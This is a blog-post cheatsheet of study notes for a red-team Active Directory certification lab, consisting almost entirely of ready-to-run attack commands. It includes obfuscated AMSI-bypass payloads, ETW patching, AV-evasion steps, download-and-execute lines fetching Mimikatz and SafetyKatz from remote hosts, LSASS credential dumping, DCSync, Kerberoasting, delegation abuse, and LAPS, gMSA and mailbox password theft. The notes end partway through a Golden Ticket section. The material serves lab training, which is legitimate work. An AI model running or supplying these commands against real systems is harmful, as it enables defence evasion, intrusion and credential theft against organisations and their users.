---
layout: post
title: CRTE Notes
date: 2023-12-01
categories: [Cheatsheet, Study Notes, Altered Security]
tags: [Cheatsheet, Study Notes, Altered Security]
---
>   Source: [Altered Security](https://www.alteredsecurity.com/redteamlab)

# I. Offensive PowerShell

>   PowerShell is NOT `powershell.exe`. It is the `System.Management.Automation.dll`

### Bypassing Execution Policy

>   It is NOT a security measure, it is present to prevent user from accidently executing scripts.

-   Several ways to bypass
    -   `powershell –ExecutionPolicy bypass`
    -   `powershell –c <cmd>`
    -   `powershell –encodedcommand`
    -   `$env:PSExecutionPolicyPreference="bypass"`

### Bypassing PowerShell Security with [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)

```powershell
# With admin privileges:
RunWithPathAsAdmin.bat

# With non-admin privileges:
RunWithRegistryNonAdmin.bat

# Type exit from the new PowerShell session to complete the clean-up.
```

### Bypassing AV Signatures for PowerShell

##### Base64 Encoding

```powershell
# Simple base64 encoding
PS:\> $Text = 'string to encode';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Split Text, Base64 and then Concat
# Encoding Payload
PS:\> $Text = 'Amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

PS:\> $Text = 'Utils';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))

# Another example
# Encoding Payload
PS:\> $Text = 'amsi';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Init';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText
PS:\> $Text = 'Failed';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);$EncodedText

# Decoding Paylaod
PS:\> $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA'))))
```

##### Hex Encoding

```powershell
# Encoding Payload
PS:\> "Hello World" | Format-Hex

# Decoding Payload
PS:\> $r = '48 65 6C 6C 6F 20 57 6F 72 6C 64'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_} 
PS C:\> $s
Hello World
```

##### Concatenation

```powershell
PS:\> 'AmsiUtils'

PS:\> 'Amsi' + 'Utils'
AmsiUtils
```

##### String Reversal

```powershell
# Encoding Payload
PS:\> (([regex]::Matches("testing payload",'.','RightToLeft') | foreach {$_.value}) -join '')
daolyap gnitset

# Decoding Payload
PS:\> (([regex]::Matches("daolyap gnitset",'.','RightToLeft') | foreach {$_.value}) -join '')
testing payload
```

###### Final payload for ASMI bypass

```powershell
# What we want
# PS:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Replace AmsiUtils and amsiInitFailed with the base64 encoded payload and concat the rest of the string
PS:\> [Ref].Assembly.GetType($('System.Management.Automation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA=')) + $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA=')))) + $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)

# check if ASMI is bypassed
PS:\> IEX(iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

###### Final payload 2 for ASMI bypass

```powershell
PS:\> $w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = 'Amsi'+'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAA==')));$b = 'siIn';$k = (([regex]::Matches("deliaFti",'.','RightToLeft') | foreach {$_.value}) -join '');$field = $assembly.GetField(('{0}{1}{2}' -f $n,$b,$k),'NonPublic,Static');$field.SetValue($null,$true)
```

### Patching Event Tracing For Windows

By disabling or manipulating ETW, we can prevent security tools from logging our actions or tracking our movement within a system.

##### Use Invoke-Obfuscation

```powershell
Invoke-Obfuscation> SET SCRIPT BLOCK [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

Invoke-Obfuscation> ENCODING
# use AES encryption
Invoke-Obfuscation> ENCODING\5

# Copy encrypted payload
# Disable ASMI using final payload 2
# Paste encrypted payload
```

### Offensive .NET - AV Bypass Ofbuscation

```powershell
# Check malicious binary with ThreatCheck (https://github.com/rasta-mouse/ThreatCheck)
C:\> Threatcheck.exe -f Rubeus.exe

# Use ConfuserEx (GUI) to obfuscate binary launch (https://github.com/mkaring/ConfuserEx)
# In Project tab select the Base Directory where the binary file is located
# In Setting Tab, add the rule and edit the rule to select the preset as Normal
# In Protect tab click on the protect button

# Analyze with ThreatCheck again to make sure its obfuscated successfully
C:\> Threatcheck.exe -f RubeusObfuscated.exe
```

### Offensive .NET - Payload Delivery

```powershell
# We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
# It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
C:\Users\Public\> Loader.exe -path http://10.10.10.10/SafetyKatz.exe 

# Use AssemblyLoader.exe (https://github.com/KINGSABRI/AssemblyLoader) to load the NetLoader in-memory from a URL which then loads a binary from a filepath or URL
C:\Users\Public\> AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10.10.10.10/SafetyKatz.exe
```

# II. Domain Enumeration

### PowerView Basic Enumeration

###### 

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain xyz.local

# Get domain SID for the current domain
Get-DomainSID

# Get DC for the current domain
Get-NetDomainController

# Get DC for another domain
Get-NetDomainController -Domain xyz.local

# Get a list of users in the current domain
Get-NetUser
Get-NetUser -Username student1

# Get list of all properties for users in the current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get a list of computers in the current domain
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData

# Get all the groups in the current domain
Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -FullData
Get-NetComputer -Domain

# Get all groups containing the word "admin" in group name
Get-NetGroup *admin*
Get-NetGroup -GroupName *admin*
Get-NetGroup *admin* -FullData
Get-NetGroup -GroupName *admin* -Doamin xyz.local

# Get all the members of the Domain Admins group
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members

# Get the group membership for a user
Get-NetGroup -UserName "student1"

# List all the local groups on a machine (needs admin privilege) 
Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -ListGroups


# Get members of all the local groups on a machine (needs admin privilege)
Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -Recurse

# Get actively logged users on a computer (needs local admin rights)
Get-NetLoggedon -ComputerName dcorp-dc.abc.xyz.local 

# Find sensitive files and shares in current domain.
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer
```

### PowerView GPO Enumeration

##### Get list of GPO in current domain.

```powershell
Get-NetGPO
Get-NetGPO -ComputerName dcorp-student1.abc.xyz.local
Get-GPO -All (GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
gpresult /R /V (GroupPolicy Results of current machine)
```

##### Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```powershell
Get-NetGPOGroup 
```

##### Get users which are in a local group of a machine using GPO

```powershell
Find-GPOComputerAdmin -ComputerName student1.abc.xyz.local
```

##### Get machines where the given user is member of a specific group

```powershell
Find-GPOLocation -Username student1 -Verbose
```

##### Get OUs in a domain

```powershell
Get-NetOU -FullData
(Get-NetOU <ou>).gplink
Get-NetGPO -ADSPath '<output from (Get-NetOU <ou>).gplink'
```

### PowerView ACL Enumeration

##### Get the ACLs associated with the specified object (groups)

```powershell
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
```

##### Get the ACLs associated with the specified prefix to be used for search

```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

##### We can also enumerate ACLs using `ActiveDirectory` module but without resolving GUIDs

```powershell
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=abc, DC=xyz,DC=local").Access
```

##### Get the ACLs associated with the specified LDAP path to be used for search

```powershell
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=abc,DC=xyz,DC=local" -ResolveGUIDs -Verbose
```

##### Search for interesting ACEs

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

##### Get the ACLs associated with the specified path

```powershell
Get-PathAcl -Path "\\dcorp-dc.abc.xyz.local\sysvol"
```

### PowerView Trust Enumeration

##### 

```powershell
# Get a list of all domain trusts for the current domain
Get-NetDomainTrust
Get-NetDomainTrust -Domain us.abc.xyz.local

# Get details about the current forest
Get-NetForest
Get-NetForest -Forest eurocorp.local

# Get all domains in the current forest
Get-NetForestDomain
Get-NetForestDomain -Forest eurocorp.local

# Get all global catalogs for the current forest
Get-NetForestCatalog
Get-NetForestCatalog -Forest eurocorp.local

# Map trusts of a forest
Get-NetForestTrust
Get-NetForestTrust -Forest eurocorp.local

# Find all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

# Find computers where a domain admin (or specified user/group) has sessions

Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"

# To confirm admin access
Invoke-UserHunter -CheckAccess

# Find computers where a domain admin is logged-in
Invoke-UserHunter -Stealth

# Find computers where a domain admin (or specified user/group) has sessions
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "StudentUsers"

# Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)
Find-DomainUserLocation -CheckAccess

# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
Find-DomainUserLocation –Stealth
```

# III. Local Privilege Escalation

### Service Path Privilege Escalation using PowerUp

##### 

```powershell
# Get services with unquoted paths and a space in their name.
Get-ServiceUnquoted -Verbose
Get-WmiObject -class win32_service | select pathname (wmi command/lists all paths)

# Get services where the current user can write to its binary path or change arguments to the binary
Get-ModifiableServiceFile -Verbose

# Get the services whose configuration current user can modify
Get-ModifiableService -Verbose
```

#### Run all checks from :

###### PowerUp

```powershell
Invoke-Allchecks
Invoke-ServiceAbuse -Name '<ServiceName>' -UserName '<domain  >\<our_user>'
```

###### BeRoot is an executable:

```powershell
.\beRoot.exe
```

###### Privesc:

```powershell
Invoke-PrivEsc
```

# IV. Lateral Movement

### Cmdlets [ `New-PSSession` ]

###### Connect to a PS-Session of a remote user

```powershell
Enter-PSSession -Computername dcorp-adminsrv.abc.xyz.local
```

##### Execute Stateful commands using `Enter-PSSession` ( persistence )

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
Enter-PSSession -Session $sess

[dcorp-adminsrv.abc.xyz.local]:PS> $proc = Get-Process
[dcorp-adminsrv.abc.xyz.local]:PS> exit

Enter-PSSession -Session $sess

[dcorp-adminsrv.abc.xyz.local]:PS> proc
Will list current process
```

### Cmdlets [ `Invoke-Command` ]

##### Execute Stateful commands using Invoke-Command ( persistence )

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

##### Display allowed commands we can execute on remote machine

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}
```

##### Write File using `ScriptBlock`

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
```

##### Edit file using `ScriptBlock`

```powershell
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
```

##### Command execution using command and `ScriptBlock`

```powershell
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -command {whoami}
Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {whoami}
```

##### File execution using `ScriptBlock`

```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
```

##### File execution using `FilePath`

```powershell
Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -FilePath "C:\temp\mimikatz.exe"
```

##### Language Mode

```powershell
Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

##### Execute locally loaded function on the remote machines

###### Example : **Hello.ps1**

```powershell
function hello
{
Write-Output "Hello from the function"
}
```

###### Now we can load the function on our machine

```powershell
. .\Hello.ps1
```

###### Now we can execute the locally loaded functions

```powershell
Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.abc.xyz.local
```

##### Directly load function on the remote machines using FilePath

```powershell
$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
Enter-PSSession -Session $sess

[dcorp-adminsrv.abc.xyz.local]:PS> hello
Hello from the function
```

##### Windows Tradecraft

-   PowerShell remoting supports the system-wide transcripts and deep script block logging.
-   We can use **winrs** in place of **PSRemoting** to evade the logging (and still reap the benefit of 5985 allowed between hosts)

```powershell
C:\> winrs -remote:us-mgmt -u:us\administrator - p:Pass@1234 cmd.exe
```

# V. Dumping Credentials

### Lateral Movement [ `Invoke-Mimikatz`, `SafetyKatz`, `Rubeus.exe` ]

```powershell
# Dump credentials on a local machine
Invoke-Mimikatz -DumpCreds

# Dump credentials on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

##### OverPass-The-Hash : generate tokens from hashes

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:abc.xyz.local /ntlm:<ntImhash> /run:powershell.exe"'

# Invoke-Mimikatz using AES
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

# Rubeus.exe
# Below doesn't need elevation
Rubeus.exe asktgt /user:administrator /rc4: /ptt

# Below command needs elevation
Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

##### DCSync Attack

-   To extract credentials from the DC without code execution on it, we can use `DCSync`
-   To use the `DCSync` feature for getting `krbtgt` hash execute the below command with DA privileges for us domain
-   By default, Domain Admins privileges are required to run `DCSync`

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

### Other ways to extract creds from LSASS

##### Invoke-Mimikatz

```powershell
# 1. Dump credentials on a local machine using Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

##### SafetyKatz & SharpKatz

```powershell
# 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"

# 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)
SharpKatz.exe -Command ekeys
```

##### Dumpert

```powershell
# 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

##### pypykatz

```powershell
# 5. Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa
```

##### comsvcs.dll

```powershell
# 6. Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

>   Now Extract the creds from lsass dump

```powershell
# Run mimikatz
# set the location of the lsass dump
sekurlsa::minidump C:\AD\Tools\lsass.DMP

# get the debug privs
privilege::debug

# now get the ekeys
sekurlsa::ekeys
```

##### SharpKatz

```powershell
# 7. Using SharpKatz.exe to do DCSync Attack
SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
```

# VI. Domain Privilege Escalation

### Kerberoast

##### Methodology

>   1.   Find service accounts.
>   2.   Request for their TGS.
>   3.   Check if kerberoastable and then get their hashes.
>   4.   Try to crack their hashes to get the service account’s password.

##### Find user accounts as Service accounts

```powershell
# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView
Get-DomainUser -SPN

# Rubeus
# List Kerberoast stats
Rubeus.exe kerberoast /stats

# Request TGS
Rubeus.exe kerberoast /user:serviceaccount /simple

# Look for kerberoastable accounts that only supports RC4_HMAC to avoid detections
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

##### Crack ticket using `tgsrepcrack`

```powershell
# Check if the ticket has been granted
klist.exe

# Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack the Service account password
python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt
'.\2-40a10000-studentuser@USSvc~serviceaccount￾US.TECHCORP.LOCAL.kirbi
```

### Unconstrained Delegation

##### PowerView

###### Enumerate computers with Unconstrained Delegation

```powershell
Get-NetComputer -UnConstrained
```

###### Check if a token is available and save to disk

>   **Get admin token** after compromising the computer with UD enabled, we can trick or wait for an admin connection

```powershell
# After admin connects
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

###### Reuse of the DA token

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
```

##### Abusing Printer Bug

###### Start Rubeus in monitoring mode

```powershell
# Capture the TGT
.\Rubeus.exe monitor /interval:5
```

###### MS-RPRN

>   https://github.com/leechristensen/SpoolSample

```powershell
.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

OR

###### PetitPotam

>   https://github.com/topotam/PetitPotam

```powershell
.\PetitPotam.exe us-web us-dc
```

###### Capture the TGT run DCSync

```powershell
# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker machine
.\Rubeus.exe ptt /ticket:

# OR use Invoke-Mimikatz
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

### Constrained Delegation with Protocol Transition

##### PowerView

###### Enumerate users and computers with CD enabled

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

##### Kekeo

###### Requesting a TGT

```powershell
# Reqyest a TGT for the first hop service account
tgt::ask /user:appsvc /domain:us.techcorp.local
/rc4:1D49D390AC01D568F0EE9BE82BB74D4C 
```

###### Request a TGS

```powershell
tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/us-mssql.us.techcorp.local 
```

##### Invoke-Mimikatz

###### Inject the ticket

```powershell
Invoke-Mimikatz '"kerberos::ptt  TGS_Administrator@US.TECHCORP.LOCAL_HTTP~us-mssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"' 
```

###### Execute DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

##### ScriptBlock

```powershell
Inoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
```

##### Rubeus

###### 1. Request for a `S4U`

```powershell
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt 
```

###### 2. Remote login using `winrs`

```powershell
winrs -r:us-mssql cmd.exe
```

### Resource-based Constrained Delegation

###### 1. Enumerate if we have Write permissions over any object.

```powershell
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
```

###### 2. Using AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want

```powershell
.\Rubeus.exe s4u /user:student1$ /aes256:d10... /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

winrs -r:us-helpdesk cmd.exe
```

### Constrained Delegation with Kerberos Only

###### 1. Assume we have already compromised us-mgmt. We want to configure RBCD on us-mgmt using us-mgmt$ computer account.

```powershell
# Configure RBCD on us-mgmt using us-mgmt$ computer account.
C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256Lcc3.. /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap

Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcompx$ -Verbose
```

###### 2. Request a new forwardable TGS/Service Ticket by leveraging the ticket created.

```powershell
C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxj... /user:us-mgmt$ /aes256:cc3... /msdsspn:cifs/us-mssql.us.techcorp.local /alterservice:http /nowrap /ptt

# Access the us-mssql using WinRM as the Domain Admin
winrs -r:us-mssql.us.techcorp.local cmd.exe
```

### LAPS (Local Administrator Password Solution)

##### Methodology/Steps

>   1.  Identify the user who can read the LAPS creds
>   2.  Identify the OU where LAPS is implemented and which user can read it
>   3.  After compromising the user who can read the LAPS, read the creds

------

##### PowerView

###### 1. To find users who can read the passwords in clear text machines in OUs

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

###### 2. To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text

```powershell
# Using Active Directory module
.\Get-LapsPermissions.ps1

# Using LAPS module (can be copied across machines)
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

###### 3. Once we compromise the user which has the Rights, use the following to read clear-text password

```powershell
# Powerview
Get-DomainObject -Identity <targetmachine$> | select - ExpandProperty ms-mcs-admpwd

# Active Directory module
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

# LAPS module
Get-AdmPwdPassword -ComputerName <targetmachine>
```

### gMSA (group Managed Service Account)

##### Methodology

>   1.   A `gMSA` has a object class `msDS-GroupManagedServiceAccount`.
>   2.   The attribute `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) list the principals that can read the password blob.
>   3.   The attribute ‘`msDS-ManagedPassword` stores the password blob in binary form of `MSDS-MANAGEDPASSWORD_BLOB`.
>   4.   Once we compromised a principal that can read the blob, use `DSInternals` to compute the NTLM hash.
>   5.   Pass the NTLM hash of `gMSA` and get the privileges.

```powershell
# 1. Enumeration of account
# Using ADModule
Get-ADServiceAccount -Filter *

# Using PowerView
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

# 2. Enumerate password blob
# List principals that can read the password blob
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

# 3. Compute NTLM hash from password blob
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordlob ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

# 4. Pass the Hash
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c...
```

### MS Exchange

##### Methodology/Steps

>   1.  Load in [MailSniper](https://github.com/dafthack/MailSniper) using powershell
>   2.  Enumerate and pull all the emails
>   3.  Save all the emails in a file called emails.txt
>   4.  Now check if you have access to any other mailboxes
>   5.  Check for data inside the email address where the body contains data like password or creds

------

##### MailSniper

```powershell
# 1. Enumerate all mailboxes
Get-GlobalAddressList -ExchHostname us-exchange -verbose -UserName us\studentuser1 -password <password>

# 2. Enumerate all mailboxes we have access to (means current user)
Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt -ExchHostname us-exchange -verbose 

# 3. Once we have identified mailboxes where we can read emails, use the following to read emails. The below command looks for terms like pass, creds, credentials from top 100 emails.
Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -OutputCsv .\mail.csv
```

### Resource Based Constrained Delegation

###### 

```powershell
# 1. Enumerate if we have Write permissions over any object
# PowerView
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

# 2. Configure RBCD on us-helpdesk for student machines
# Using AD Module
$comps = 'student1$','student2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps

# 3. We we can dump the AES Keys of the Students
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# SafetyKatz Binary
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"

# 4. Rubeus
.\Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

# 5. Winrs
winrs -r:us-helpdesk cmd.exe
```

# VII. Domain Persistence

### msDS-AllowedToDelegateTo

##### PowerView

```powershell
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us￾dc.us.techcorp.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

Get-DomainUser –TrustedToAuth
```

##### Kekeo

```powershell
kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!
kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' 
```

##### Rubeus

```powershell
Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local 

Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6
/impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt 

.\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit" 
```

### Golden Ticket 

##### Methodology/Steps

> 1. Get a Powershell session as a **DA** using **Over PtH** attack
>
> 2. Create a **New-PSSession** attaching to the **DC**
>
> 3. Enter the new session using **Enter-PSSession** 
>
> 4. Bypass the *AMSI*  and exit.
>
> 6. Load **Mimikatz.ps1** on the new session using **Invoke-command**
>
> 7. Enter the new session using **Enter-PSSession** *again*
>
